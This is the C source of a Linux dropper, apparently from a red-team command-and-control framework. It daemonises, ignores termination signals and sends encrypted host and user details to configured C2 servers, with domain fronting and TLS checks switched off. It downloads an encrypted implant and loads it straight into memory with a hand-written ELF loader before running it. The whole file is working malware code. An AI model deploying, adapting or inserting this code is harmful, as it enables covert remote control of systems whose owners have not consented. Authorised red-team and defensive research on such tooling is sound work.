/* Dropper 
 *
 * This file contains the basic logic to connect to the C2 server and download the implant
 * 
 * The imlant is loaded into memory with load_elf, and the function 'loopy' is executed
 *
 * load_elf has only been tested on so files produced with this Makefile - other static exes *may* work but ymmv
 *
 * TODO:
 *   - other architectures (e.g. ARM)
 *   - process supervision
 */

#include <stdlib.h>
#include <link.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <dlfcn.h>
#include <pwd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <curl/curl.h>
#include "mbedtls/aes.h"
#include "libelf.h"
#include "libc.h"
#include "base64.h"
#include "common.h"

#define SLEEP_INT 5

// Create a dummy config item in its own section. We'll change it out later with objcopy in posh
const char config_start[1] __attribute__((__section__(".configuration")));
// and some pointers to the start and end. These will be provided by the linker script
extern const char* posh_config_start;
extern const char* posh_config_end;

void *load_elf(unsigned char *buf_start, size_t buf_size, unsigned char **exec_ptr, struct __libc *__libc, char ***__environ){
	Elf32_Ehdr *hdr = NULL;
	Elf32_Phdr *phdr = NULL;
	Elf32_Shdr *shdr = NULL;
	Elf32_Sym *symbols = NULL;
	unsigned char *exec = *exec_ptr;
	char *strings = NULL;
	unsigned char *temp_addr = NULL;
	unsigned char *pheader_start = NULL;
	unsigned char *addr = NULL;
	unsigned char *_init_addr = NULL;
	uint32_t _init_array = 0;
	uint32_t _init_array_sz=0;

	dprintf("Loading elf (%d bytes)\n", buf_size);


	if (exec == NULL) {
		dprintf("%s", "Error allocating memory\n");
		exit(1); // this is a pretty fundamental issue so give up
	} 

	dprintf("Base address: %08x\n", (uint32_t)(uint32_t *)exec);
	uint32_t base_addr = (uint32_t)(uint32_t *)exec;
	memset(exec, 0, buf_size);

	// Assume we were actually given an elf file  - TODO should check the magic
	hdr = (Elf32_Ehdr *)buf_start;
	dprintf("Header: %x\n", (uint32_t)hdr);

	// pointer to Elf program header	
	if (hdr->e_phoff != 0){
		phdr = (Elf32_Phdr *)(buf_start + hdr->e_phoff);	
		dprintf("program header offset @ %x\n", hdr->e_phoff);
	} else {
		dprintf("%s", "No programme header\n");
		exit(1);
	}

	// pointer to elf section header	
	if (hdr->e_shoff != 0){
		shdr = (Elf32_Shdr *)(buf_start + hdr->e_shoff);
		dprintf("section Header at %x\n", hdr->e_shoff);
	} else {
		dprintf("%s", "Oops - expecting a section header\n");
		exit(1);
	}

	dprintf("We have %d prog headers\n", hdr->e_phnum);

	// loop through program headers and copy into memory if needed
	for(int i=0; i < hdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_DYNAMIC){
			dprintf("Looking at dynamic section @ offset 0x%08x\n", phdr[i].p_offset);
			dprintf("Size: 0x%08x (%d entries)\n", phdr[i].p_filesz, phdr[i].p_filesz / sizeof(Elf32_Dyn));
			Elf32_Dyn *dyn_section = (Elf32_Dyn *)(buf_start + phdr[i].p_offset);
			for (int j=0; j<phdr[i].p_filesz / sizeof(Elf32_Dyn); j++){
				dprintf("%s", "Dynamic section obj: \t");
				switch (dyn_section[j].d_tag) {
					case DT_INIT:
						dprintf("_init @ 0x%08x", dyn_section[j].d_un.d_ptr+base_addr);
						// TODO - would be better to use this as our init pointer, rather than parsing the symbol table (below) as no guarantee on naming convention
						break;
					case DT_FINI:
						dprintf("%s\n", "DT_FINI - TODO");
						// not implemented (yet) - we don't plan to unload the implant
						break;
					case DT_INIT_ARRAY:
						dprintf("%s\n", "DT_INIT_ARRAY");
						dprintf("\t0x%08x", dyn_section[j].d_un.d_val);
						dprintf("\t0x%08x", dyn_section[j].d_un.d_ptr);
						_init_array = dyn_section[j].d_un.d_val;
						break;
					case DT_INIT_ARRAYSZ:
						dprintf("%s\n", "DT_INIT_ARRAYSZ");
						dprintf("\t0x%08x", dyn_section[j].d_un.d_val);
						_init_array_sz = dyn_section[j].d_un.d_val/4; // in bytes!
						break;
					case DT_FINI_ARRAY:
						dprintf("%s\n", "DT_FINI_ARRAY - TODO"); //TODO
						break;
					default:
						dprintf("%0d", dyn_section[j].d_tag);

				}
				dprintf("%s", "\n");
				if (dyn_section[j].d_tag == 0){
					break;
				}
			}
			/*if (_init_array!=0){ // TODO Remove this as we call it later on (after relocations)
				for (int k=0; k<_init_array_sz; k++) {
					dprintf("Init function at: 0x%08x + 0x%08x = 0x%08x\n", _init_array, base_addr, _init_array+base_addr);
					dprintf("Base addr: 0x%08x\n", base_addr);
				}
			}*/
		}
		if(phdr[i].p_type != PT_LOAD) {
			dprintf("Not loading %d\n", i);
			continue;
		} else if (!phdr[i].p_filesz) {
			dprintf("No fileisze on %d", i);
			continue;
		}

		dprintf("p_offset: %x, vaddr: %x\n", phdr[i].p_offset, phdr[i].p_vaddr);
		
		//work out offset in file
		pheader_start = buf_start + phdr[i].p_offset;

		//work out offset in memory
		temp_addr = exec + phdr[i].p_vaddr;

		//copy from file into memory
		memmove(temp_addr, pheader_start, phdr[i].p_filesz);

	}
	
	dprintf("We have %d section headers\n", hdr->e_phnum);

	// loop through section headers and process. We do this twice, once to get the symbols, then another time to do the relocations.
	Elf32_Shdr *sh_strtab = &shdr[hdr->e_shstrndx];
	char *sh_strtab_p = (char *)buf_start + sh_strtab->sh_offset;
	uint32_t libc_offset = 0;
	uint32_t environ_offset = 0;

	for(int i=0; i < hdr->e_shnum; ++i) {
		if (strcmp(sh_strtab_p + shdr[i].sh_name, ".got") == 0) {
			dprintf("%s", "GOT GOT\n");
			dprintf("address: %x\n", shdr[i].sh_addr);
		}
		if (strcmp(sh_strtab_p + shdr[i].sh_name, ".got.plt") == 0) {
			dprintf("%s", "GOT GOT.plt\n");
			dprintf("address: %x\n", shdr[i].sh_addr);
		}
		if ( shdr[i].sh_type == SHT_SYMTAB || shdr[i].sh_type == SHT_DYNSYM) {
			dprintf("Symbol table%d\n", i);
		
			// symbol table is at offset given by the header offset
			symbols = (Elf32_Sym *)(buf_start + shdr[i].sh_offset);

			// sh_link contains the section header index of the strings table associated with the symbol table
			// we can find the string table by taking the header index, and finding it's offset
			strings = (char *)buf_start + shdr[shdr[i].sh_link].sh_offset;

			// loop through each symbol in the table
			for (int j=0; j<shdr[i].sh_size / sizeof(Elf32_Sym); j++){
				// find the name of the symbol in the strings table
				dprintf("\t symbol @ index %d: \"%s\" - table: %x, value %x\n", j, strings + symbols[j].st_name, symbols[j].st_shndx, symbols[j].st_value);
				// probs want to check the type and name
				if (strcmp("_init", strings + symbols[j].st_name) == 0) { // && ELF32_ST_TYPE(symbols[j].st_info) == STT_FUNC) { 
					dprintf("\n\nFound _init function at %x\n\n", (uint32_t)exec + symbols[j].st_value); // TODO - there might nto be na init function
					fflush(stdout);
					_init_addr = exec + symbols[j].st_value;
				}
				// this will be our entry point into the implant
				if (strcmp("loopy", strings + symbols[j].st_name) == 0 && ELF32_ST_TYPE(symbols[j].st_info) == STT_FUNC) { 
					dprintf("\n\nFound looper function at %x\n\n", (uint32_t)exec + symbols[j].st_value);
					fflush(stdout);
					addr = exec + symbols[j].st_value;
				}
				// save the location of the libc symbol, later on we'll "initialise" it
				if (strcmp("__libc", strings + symbols[j].st_name) == 0) {
					dprintf("%s\n", "\n Found __libc");
					libc_offset = symbols[j].st_value;
				}
				// again, save location of __environ variable so we can point at parent 
				if (strcmp("__environ", strings + symbols[j].st_name) == 0) {
					dprintf("%s", "\nFound __environ\n");
					environ_offset = symbols[j].st_value;
				}
			}

		} 
	}

	// parse the section headers a second time now we have our symbols and process the relocations	
	for (int i=0; i< hdr->e_shnum; i++) {
		if (shdr[i].sh_type == SHT_REL) {
			dprintf("Processing REL Section header %d\n", i);

			Elf32_Rel* rel = (Elf32_Rel*)(buf_start + shdr[i].sh_offset);

			dprintf("Size: %d\n", shdr[i].sh_size / sizeof(Elf32_Rel));

			// the relocations are applied to symbles in the table given by the rel section header sh_link value (in this case probably .dynsym)
			dprintf("Applying relocations to table %x\n", shdr[i].sh_link);

			//pointer to the symbols the relocations apply to
			Elf32_Sym *rel_syms = (Elf32_Sym *)(buf_start + shdr[shdr[i].sh_link].sh_offset);

			for(int j = 0; j < shdr[i].sh_size / sizeof(Elf32_Rel); j += 1) {
				// destination for the relocation (if it has one)
				uint32_t *rel_dst = (uint32_t *)(exec + rel[j].r_offset);
				switch(ELF32_R_TYPE(rel[j].r_info)) {
					case R_386_RELATIVE:
						//at dynamic link time, read the dword at this location, add it to the run-time start address of this module; deposit the result back into this dword
						dprintf("R_386_RELATIVE\t\t[0x%08x] = \t0x%08x + \t0x%08x\n", rel[j].r_offset, *rel_dst, base_addr);

						uint32_t val = *rel_dst;
						*rel_dst = val + base_addr;
						dprintf("\tValue at that address now: 0x%08x\n", *((uint32_t *)(exec + rel[j].r_offset)));
						break;

					case R_386_32:
						//relocation type R_386_32 means: take the value at the offset specified in the entry, add the address of the symbol to it, and place it back into the offset.
						
						dprintf("R_386_32\t\t[0x%08x] = \t0x%08xi+0x%08x\n", rel[j].r_offset, *rel_dst, base_addr + rel_syms[ELF32_R_SYM(rel[j].r_info)].st_value);
						
						uint32_t offset_value = *rel_dst;
						*rel_dst = (uint32_t)(offset_value + base_addr + rel_syms[ELF32_R_SYM(rel[j].r_info)].st_value);
						dprintf("\tValue at that address now: 0x%08x\n", *((uint32_t *)(exec + rel[j].r_offset)));
						break;

					case R_386_PC32:
						/*
						 *It means the following: take the value at the offset specified in the entry, add the address of the symbol to it, subtract the address of the offset itself, and place it back into the word at the offset. Recall that this relocation is done at load-time, when the final load addresses of the symbol and the relocated offset itself are already known. These final addresses participate in the computation.
						 */

						dprintf("R_386_PC32\t[0x%08x] = \t 0x%08x + 0x%08x - 0x%08x\n", rel[j].r_offset, *rel_dst, rel_syms[ELF32_R_SYM(rel[j].r_info)].st_value + base_addr, rel[j].r_offset + base_addr);
						// now we want to read the value at that address...so we want a pointer that points to that
						uint32_t *offset_ptr = (uint32_t  *)(exec + rel[j].r_offset);

						// read the value at that address
						uint32_t val_at_offset = (uint32_t)*offset_ptr;

						val_at_offset += base_addr + rel_syms[ELF32_R_SYM(rel[j].r_info)].st_value;
						val_at_offset = val_at_offset - (base_addr + rel[j].r_offset);

						*offset_ptr = val_at_offset;

						dprintf("\tValue at that address now: 0x%08x\n", *((uint32_t *)(exec + rel[j].r_offset)));
						break;

					case R_386_GLOB_DAT:
					case R_386_JMP_SLOT:
						dprintf("R_386_GLOB_DAT/JMP\t0x%08x\n", rel[j].r_offset);

						// offset gives us where to put the actual address for the object. find the actual address from symbol st_value?
						fflush(stdout);
						//dprintf("\tsymbol: %s, index: %d\n", dynstrings + rel_syms[ELF32_R_SYM(rel[j].r_info)].st_name, ELF32_R_SYM(rel[j].r_info));

						// write value into GOT...
						// I'm not sure this is the write way to write the address to the GOT - but it works. Assumes 32 bit addresses.
						uint32_t got_addr = (uint32_t)(exec+rel_syms[ELF32_R_SYM(rel[j].r_info)].st_value); // the address
						*rel_dst = got_addr;
						break;
					default:
						dprintf("%s\n", "Unknown relocation type");
						exit(1); // TODO - we probably want to have a way of reporting back to C2 we can't load the module rather than jsut exiting 
						break;	
				}

			}
			dprintf("%s", "Finished relocations\n");
		}
	}	
	dprintf("Base addr: 0x%08x\n", base_addr);
	// loop thro program headers and set memory protection now we've done writing to process memory
	for(int i=0; i < hdr->e_phnum; i++) {
		temp_addr = exec + phdr[i].p_vaddr;
		if(phdr[i].p_type == PT_LOAD) {
			// work out what flags we want to apply to our memory region from R W X
			// mapping from PF_{R,W,X} in the ELF header to PROT_{E,R,W} in the mprotect flags
			uint8_t flags = 0; // TODO is this the right type?
	
			if (phdr[i].p_flags & PF_X) {
				flags = flags | PROT_EXEC;
			}

			if (phdr[i].p_flags & PF_R) {
				flags = flags | PROT_READ;
			}

			if (phdr[i].p_flags & PF_W) {
				flags = flags | PROT_WRITE;
			}

			mprotect(temp_addr, phdr[i].p_memsz, flags);	
		}
	}
	
	// run _init function if found. 
	void (*init_ptr)(void);
	if (_init_addr != NULL) {
		init_ptr = (void *)_init_addr;
		dprintf("%s\n", "\nRunning _init function \n");
		(*init_ptr)();
	}
	// TODO run all the init functions rather than just reporting them. So far not needed
	if (_init_array!=0){
		for (int k=0; k<_init_array_sz; k++) {
			dprintf("DT_INIT_ARR Init function at: 0x%08x\n", _init_array+base_addr);
			dprintf("%s", "Calling init fn\n"); // TODO this is really ugly. It also only calls the first init function..
			void (*init_arr_ptr)(void);
			init_arr_ptr = (void *)*(uint32_t *)(_init_array+base_addr); 
			(init_arr_ptr)();
		}
	}

	// Some very hacky code here. There's a __libc structure in the library which contains info like where auxv is etc., which we haven't initialised yet
	// Rather than initialising, we just copy it from the __libc structure of our parent process, as we're executing in that process context
	// This may introduce some exotic bugs, we'll have to see
	// Likewise for the __environ variable
	dprintf("%s", "Fixing up __libc struct...\n");
	if (libc_offset != 0) {
		memcpy(exec + libc_offset, __libc, sizeof(struct __libc));
	}

	if (environ_offset != 0) {
		memcpy(exec + environ_offset, __environ, sizeof(char *));
	}
	dprintf("%s\n", "Done fixing, returning address");

	// return the address of our loopy function
	return addr;
}

// Collect some system info
char * get_os_data() {
	int string_len;
	pid_t pid;
	struct passwd *passwd;
	int uname_status;
	char username_placeholder[] = "<unknown_user>";

	passwd = getpwuid(getuid());

	if (passwd == NULL) {
		passwd->pw_name = username_placeholder;
	}

	// getpid is guarenteed not to fail... (if it does, you have bigger problems!)
	pid = getpid();
	
	struct utsname kernel_info;
	uname_status = uname(&kernel_info);
	
	if (uname_status==-1) { // if the call to uname fails then put some dummy values in
		// The size of the struct fields is unspecified and architecture specific so keeping the placeholder as small as possible
		strncpy(kernel_info.nodename, "unk", sizeof(kernel_info.nodename));
		strncpy(kernel_info.machine, "unk", sizeof(kernel_info.machine));
	}

	string_len = snprintf(NULL, 0, "%s;%s;%s;%s;%d;%d", passwd->pw_name, kernel_info.nodename, kernel_info.nodename, kernel_info.machine, pid, 2) + 1; // pls one to allow for termination
	char *os_data = malloc(string_len);
	snprintf(os_data, string_len, "%s;%s;%s;%s;%d;%d", passwd->pw_name, kernel_info.nodename, kernel_info.nodename, kernel_info.machine, pid, 2); 

	
	dprintf("Got OS data: %s\n", os_data);
	return os_data; 
}


int parse_config(struct config **config_p) {
	*config_p = malloc(sizeof(struct config));
	struct config *config = *config_p;

	// initialize object size counters
	config->num_domain_headers = 0;
	config->max_domain_headers = 5;
	config->domain_front_headers = (const char**)malloc(sizeof(char*) * config->max_domain_headers);
	if (config->domain_front_headers == NULL) {
		return -1;
	}

	config->num_servers = 0;
	config->max_servers = 5;
	config->serverclean = (const char**)malloc(sizeof(char*) * config->max_servers);
	if (config->serverclean == NULL) {
		return -1;
	}

	config->num_urls = 0;
	config->max_urls = 5;
	config->urls = (const char**)malloc(sizeof(char*) * config->max_urls);
	if (config->urls == NULL) {
		return -1;
	}

	config->num_icoimage = 0;
	config->max_icoimage = 5;
	config->icoimage = (const char**)malloc(sizeof(char*) * config->max_icoimage);
	if (config->icoimage == NULL) {
		return -1;
	}

	// string values are handled by being pointers into the config object
	// integers and floats are (at the moment), copied in place. Would be better to serialise better in python so could be pointers too
	// no checking is carried out on the config validity - it is assumed it is output correctly by posh
	// arrays are formed by having repeated keys

	const char *config_ptr = config_start;

	do {	
		// parse out config items
		if (startswith(config_ptr, "key=")) {
			config_ptr+=strlen("key=");
			config->key = config_ptr;

		} else if (startswith(config_ptr, "urlid=")) {
			config_ptr+=strlen("urlid=");
			config->urlid = atoi(config_ptr); 

		} else if (startswith(config_ptr, "url_suffix2=")) {
			config_ptr+=strlen("url_suffix2=");
			config->url_suffix2 = config_ptr;


		} else if (startswith(config_ptr, "domain_front_hdr=")) {
			config_ptr+=strlen("domain_front_hdr=");
			if (config->num_domain_headers >= config->max_domain_headers) {
				config->domain_front_headers = realloc(config->domain_front_headers, sizeof(char *) * (config->max_domain_headers + 5));
				if (config->domain_front_headers == NULL) {
					return -1;
				}
				config->max_domain_headers +=5;
			} 

			config->domain_front_headers[config->num_domain_headers] = config_ptr;

			config->num_domain_headers++;
			
		} else if (startswith(config_ptr, "proxy_url=")) {
			config_ptr+=strlen("proxy_url=");
			config->proxy_url = config_ptr;
		} else if (startswith(config_ptr, "proxy_pass=")) {
			config_ptr+=strlen("proxy_pass=");
			config->proxy_pass = config_ptr;

		} else if (startswith(config_ptr, "proxy_user=")) {
			config_ptr+=strlen("proxy_user=");
			config->proxy_user = config_ptr;	

		} else if (startswith(config_ptr, "urls=")) {

			config_ptr += strlen("urls=");
			if (config->num_urls >= config->max_urls) {
				config->urls = (const char **)realloc(config->urls, sizeof(char *) * (config->max_urls + 5));
				if (config->urls == NULL) {
					return -1;
				}
				config->max_urls += 5;
			}
			config->urls[config->num_urls] = config_ptr;
			config->num_urls++;

		} else if (startswith(config_ptr, "jitter=")) {

			config_ptr+=strlen("jitter=");
			config->jitter = atof(config_ptr);

		} else if (startswith(config_ptr, "sleep_time=")) {
			config_ptr+=strlen("sleep_time=");
			config->sleep_time = atoi(config_ptr);
		} else if (startswith(config_ptr, "kill_date=")) {
			config_ptr+=strlen("kill_date=");
			config->kill_date = atoi(config_ptr);

		} else if (startswith(config_ptr, "icoimage=")) {
			config_ptr+=strlen("icoimage=");
			if(config->num_icoimage >= config->max_icoimage) {
				config->icoimage = realloc(config->icoimage, sizeof(char *) * (config->max_icoimage + 5));
				if (config->icoimage == NULL) {
					return -1;
				}
				config->max_icoimage += 5;
			}
			config->icoimage[config->num_icoimage] = config_ptr;
			config->num_icoimage++;
			
		
		} else if (startswith(config_ptr, "ua=")) {
			config_ptr+=strlen("ua=");
			config->ua = config_ptr;

		} else if (startswith(config_ptr, "server_clean=")) {
			config_ptr += strlen("server_clean=");
			if (config->num_servers >= config->max_servers) {
				config->serverclean = realloc(config->serverclean, sizeof(char *) * (config->max_servers + 5));
				if (config->serverclean == NULL) {
					return -1;
				}
				config->max_servers += 5;
			}
			config->serverclean[config->num_servers] = config_ptr;
			config->num_servers++;
				
		} else {
			dprintf("Unknown key: %s", config_ptr);
		}

		// advance our config pointer to the next key
		config_ptr += strlen(config_ptr) + 1;
	} while (!startswith(config_ptr, "CONFIG_END")); 
	
	return 0;
}

int main (int argc, char *argv[]) {	
	int __attribute__((unused))fd0, __attribute__((unused))fd1, __attribute__((unused))fd2;
        pid_t pid, sid;
	extern struct __libc __libc; // get a reference to the MUSL __libc struct for elf loading  later
	extern char **__environ; // get a reference to the __environ variable so the implant can access environment variables
	void (*loopy)(generic_fp *_func_table, struct config *config); // function pointer for the implant's main function
	CURL *curl;
	CURLcode res;
	struct memory response;
	struct curl_slist *list = NULL;
	char *proxy = NULL;
	char *host_hdr = NULL;
	struct rlimit r1;
	struct sigaction sa;
	unsigned char *exec;

	// parse the config object that was linked with us at compile time
	struct config *config;
	int conf_res = parse_config(&config);
	if (conf_res != 0) {
		dprintf("%s", "error parsing config");
		exit(EXIT_FAILURE);
	}

	// daemonize
	// Set umask to clear any inherited mask
	umask(0);

	// get max file descriptors
	if (getrlimit(RLIMIT_NOFILE, &r1) < 0) {
		exit(EXIT_FAILURE);
	}


        pid = fork();
        if (pid < 0) {
                exit(EXIT_FAILURE);
        }
	// we got a pid, so we (parent) can go away now
        if (pid > 0) {
                exit(EXIT_SUCCESS);
        }
	
        sid = setsid();
        if (sid < 0) {
                exit(EXIT_FAILURE);
        }

	// fork again to guarantee not a session leader
	pid = fork();
	
        if (pid < 0) {
                exit(EXIT_FAILURE);
        }

	// we got a pid, so we (parent) can go away now
        if (pid > 0) {
                exit(EXIT_SUCCESS);
        }

	sa.sa_handler = SIG_IGN;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;


        if ((chdir("/")) < 0) {
                exit(EXIT_FAILURE);
        }

#ifndef DEBUG

	// close all open file descriptors
	if (r1.rlim_max == RLIM_INFINITY) {
		r1.rlim_max = 1024;
	}
	for (int i=0; i < r1.rlim_max; i++) {
		close(i);
	}

	fd0 = open("/dev/null", O_RDWR);
	fd1 = dup(0);
	fd2 = dup(0);


	// ignore attempts to make us quit
	signal(SIGTERM, SIG_IGN);
#endif

	//initialise our memory struct for receiving curl info	
	response.response = malloc(1);
	response.size = 0;
	
	// init random number generator
	srand(time(NULL)-getpid());

	dprintf("%s", "Starting dropper...\n");


	curl_global_init(CURL_GLOBAL_DEFAULT);

	// try and download three times
	for (int i=0; i<3; i++) {
		dprintf("%s", "Trying to connect to server...\n");
		curl = curl_easy_init();
		if(curl) {

			// Assemble the URL
			int server_idx = rand() % config->num_servers;
			char *url=malloc(strlen(config->serverclean[server_idx]) + strlen(config->url_suffix2));
			strcpy(url, config->serverclean[server_idx]);
			strcpy(url+strlen(config->serverclean[server_idx]), config->url_suffix2);
			dprintf("Assembled URL: %s\n", url);

			// check if domain fronting is configured, and set appropriate host header for the URL if it is
			if (config->num_domain_headers > 0) {
				host_hdr = malloc(strlen(config->domain_front_headers[server_idx]) + strlen("Host: ") + 1);
				strcpy(host_hdr, "Host: ");
				strcat(host_hdr, config->domain_front_headers[server_idx]);
				list = curl_slist_append(list, host_hdr);
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, list);
			}

			// set encrypted cookie with host info
			char *os_data = get_os_data(); // FREE

			size_t b64_len;
			unsigned char *enc_os_data = _encrypt(config->key, os_data, strlen(os_data), &b64_len, 1); // FREE

			char *session_cookie = malloc(b64_len + strlen("SessionID=") + 1); // FREE
			sprintf(session_cookie, "SessionID=%s", enc_os_data);
			dprintf("Sending session cookie %s", session_cookie);
			curl_easy_setopt(curl, CURLOPT_COOKIE, session_cookie);
			curl_easy_setopt(curl, CURLOPT_URL, url);

			// Skip SSL key verification 
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

			// send all received data to this function
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_cb);
			// we pass our 'chunk' struct to the callback function
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);

#ifdef DEBUG
			// you probably don't want verbose, cos it will echo the entire implant to the console
			// but it's here if you do...
			//curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
#endif
			// ua is configured by C2 server at build time

			curl_easy_setopt(curl, CURLOPT_USERAGENT, config->ua);

			// if proxy url defined, set it as a curl option
			// if it's not defined, curl will pick up environment settings automagically
			if (strlen(config->proxy_url) > 0) {
				proxy = get_proxy(config->proxy_url, config->proxy_user, config->proxy_pass);
				if (proxy) {
					curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
				}
			}

			res = curl_easy_perform(curl);

			

			free(enc_os_data);
			free(os_data);
			free(session_cookie);		
			free(proxy);

			// cleanup ready for next time
			curl_easy_cleanup(curl);
			if ( config->num_domain_headers > 0 ){
				curl_slist_free_all(list);
				free(host_hdr);
			}


			// check for errors
			if(res != CURLE_OK) {
				dprintf("curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
				sleep(SLEEP_INT);
				// go round and try again
				continue;
			} else {
				dprintf("Got %d bytes\n", response.size);
				dprintf("Got: %s\n\n", response.response);
			}
				      
		} else {
			sleep(SLEEP_INT);	
			continue;
		}

		size_t response_len;

		// hopefully, we've been left with an encrypted memory buffer in response.response.
		// decode base64
		unsigned char *response_bytes = base64_decode(response.response, response.size, &response_len);
		dprintf("Got response len %d", response_len);

		if (response_len == 0) {
			free(response_bytes); 
			sleep(SLEEP_INT);	
			continue;
		}
		// decrypt decoded response
		size_t response_pt_len;
		unsigned char *response_pt_b64 = _decrypt(config->key, response_bytes, response_len, &response_pt_len);

		if (response_pt_b64 == NULL) {
			printf("E"); // TODO - die define, go round again
			sleep(SLEEP_INT);	
			continue;
		}

		// decode decrypted response
		unsigned char *response_pt = base64_decode(response_pt_b64, response_pt_len, &response_pt_len);
		
		// map some memory to load our executable into. We do it here so we can unmap it later	
		// TODO not exec -mark exec later
		exec = mmap(NULL, response_pt_len, PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

		// now we've decoded our payload, load it into memory
		loopy = load_elf(response_pt, response_pt_len, &exec, &__libc, &__environ);
		
		// define some functions our implant will want to use. This means we don't need to link it against libcurl
		// we define this here, as common is included in the implant
		// The ordering MUST match the order in common.h, otherwise weird and wonderful things happen
		generic_fp _func_table[9] = { (generic_fp)curl_easy_init, 
						(generic_fp)curl_easy_setopt,
						(generic_fp)curl_easy_perform,
						(generic_fp)curl_easy_cleanup,
						(generic_fp)curl_slist_free_all,
						(generic_fp)curl_slist_append,
						(generic_fp)curl_global_init,
						(generic_fp)get_config_item,
						(generic_fp)set_sleep_time,
		};

		// call our implant function. We shouldn't return from there
		dprintf("%s", "Calling our implant\n");
		(*loopy)(_func_table, config);
		// .. but if we do, loop round again and have another go
		munmap(exec, response_pt_len);
	}	

	// we couldn't contact C2 and get a valid payload, we're off
	printf("error\n");
	curl_global_cleanup();
	exit(EXIT_FAILURE);

}
